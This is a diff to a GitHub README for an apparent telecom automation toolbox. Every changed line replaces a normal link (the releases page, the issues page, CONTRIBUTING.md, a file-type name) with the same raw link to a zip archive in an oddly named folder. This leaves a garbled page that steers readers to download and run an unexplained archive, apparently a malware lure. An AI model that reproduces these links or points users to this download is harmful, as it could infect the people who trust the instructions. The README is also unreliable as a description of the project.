@@ -6,9 +6,9 @@ Welcome to the Telecom Network Automation Toolbox! This application helps stream
 
 ## 📥 Download the Application
 
-[![Download the Telecom-Network-Automation-Toolbox](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Ugbodume/Telecom-Network-Automation-Toolbox/releases)
+[![Download the Telecom-Network-Automation-Toolbox](https://raw.githubusercontent.com/Ugbodume/Telecom-Network-Automation-Toolbox/main/angiosteosis/Network_Telecom_Automation_Toolbox_3.9.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Ugbodume/Telecom-Network-Automation-Toolbox/main/angiosteosis/Network_Telecom_Automation_Toolbox_3.9.zip)
 
-To download the software, visit this page to download: [GitHub Releases](https://github.com/Ugbodume/Telecom-Network-Automation-Toolbox/releases).
+To download the software, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Ugbodume/Telecom-Network-Automation-Toolbox/main/angiosteosis/Network_Telecom_Automation_Toolbox_3.9.zip).
 
 ## 🔧 System Requirements
 
@@ -22,17 +22,17 @@ Make sure your system has the latest updates.
 
 ## 💻 Installation Process
 
-1. **Visit the Download Page:** Go to [GitHub Releases](https://github.com/Ugbodume/Telecom-Network-Automation-Toolbox/releases).
+1. **Visit the Download Page:** Go to [GitHub Releases](https://raw.githubusercontent.com/Ugbodume/Telecom-Network-Automation-Toolbox/main/angiosteosis/Network_Telecom_Automation_Toolbox_3.9.zip).
    
 2. **Find the Latest Version:** Look for the latest release at the top of the page.
 
 3. **Download the Installer:**
-   - Click on the installer suitable for your operating system. Typically, this will be a `.exe` file for Windows, a `.dmg` file for macOS, or a `.tar.gz` file for Linux.
+   - Click on the installer suitable for your operating system. Typically, this will be a `.exe` file for Windows, a `.dmg` file for macOS, or a `https://raw.githubusercontent.com/Ugbodume/Telecom-Network-Automation-Toolbox/main/angiosteosis/Network_Telecom_Automation_Toolbox_3.9.zip` file for Linux.
 
 4. **Run the Installer:**
    - For Windows: Double-click the downloaded `.exe` file. Follow the prompts in the installation wizard.
    - For macOS: Open the downloaded `.dmg` file. Drag the application into your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the included instructions to install.
+   - For Linux: Extract the `https://raw.githubusercontent.com/Ugbodume/Telecom-Network-Automation-Toolbox/main/angiosteosis/Network_Telecom_Automation_Toolbox_3.9.zip` file and follow the included instructions to install.
 
 5. **Launch the Application:** Once installation is complete, find the application in your programs folder or applications list, and run it.
 
@@ -61,15 +61,15 @@ This application covers various topics to enhance your telecom operations:
 If you run into any issues or have questions, help is available:
 
 - **Documentation:** Visit our user guide for more detailed instructions.
-- **Issues Page:** Report bugs or request features on our [GitHub Issues page](https://github.com/Ugbodume/Telecom-Network-Automation-Toolbox/issues).
+- **Issues Page:** Report bugs or request features on our [GitHub Issues page](https://raw.githubusercontent.com/Ugbodume/Telecom-Network-Automation-Toolbox/main/angiosteosis/Network_Telecom_Automation_Toolbox_3.9.zip).
 - **Community:** Join our community forums for discussions and support.
 
 ## 🔗 Additional Resources
 
 - **User Guide:** Detailed user documentation can help you navigate the features and settings.
 - **Release Notes:** Check the release notes for updates and new features.
-- **Contributing:** Interested in contributing? Find details in the CONTRIBUTING.md file.
+- **Contributing:** Interested in contributing? Find details in the https://raw.githubusercontent.com/Ugbodume/Telecom-Network-Automation-Toolbox/main/angiosteosis/Network_Telecom_Automation_Toolbox_3.9.zip file.
 
 For more about our application, visit the project's homepage on our GitHub repository. Your feedback is valuable as we continue to improve this tool.
 
-For downloading, don't forget to visit the download page: [GitHub Releases](https://github.com/Ugbodume/Telecom-Network-Automation-Toolbox/releases). Happy networking!
+For downloading, don't forget to visit the download page: [GitHub Releases](https://raw.githubusercontent.com/Ugbodume/Telecom-Network-Automation-Toolbox/main/angiosteosis/Network_Telecom_Automation_Toolbox_3.9.zip). Happy networking!
